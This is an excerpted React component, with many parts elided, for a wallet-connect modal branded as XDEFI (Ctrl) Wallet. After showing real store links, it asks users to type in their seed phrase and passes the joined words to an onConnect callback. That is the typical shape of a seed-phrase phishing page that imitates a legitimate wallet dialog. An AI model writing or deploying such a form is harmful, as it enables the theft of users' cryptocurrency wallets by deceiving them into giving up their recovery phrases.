...
export default function XDEFIWalletModal({ onClose, onConnect, onBack }) {
  ...
  const handleConnect = () => {
    ...
    if (!allValid) return;
    if (onConnect) onConnect('XDEFI Wallet', seedWords.join(' '));
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>XDEFI Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/XDEFI-log.jpg" alt="XDEFI Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  XDEFI Wallet (now Ctrl Wallet) is a non-custodial multi-chain wallet with built-in swap and bridge support. Use the links below to install the browser extension, visit the website, or get the mobile apps.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get XDEFI Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chrome.google.com/webstore/detail/ctrl-wallet/hmeobnfnfcmdkdcmlblgagmfpfboieaf"
                    target="_blank"
                  ...
                  <a
                    href="https://apps.apple.com/us/app/ctrl-wallet/id6446305342"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  <a
                    href="https://play.google.com/store/apps/details?id=xyz.ctrl.wallet"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your XDEFI seed phrase to continue.
              </p>
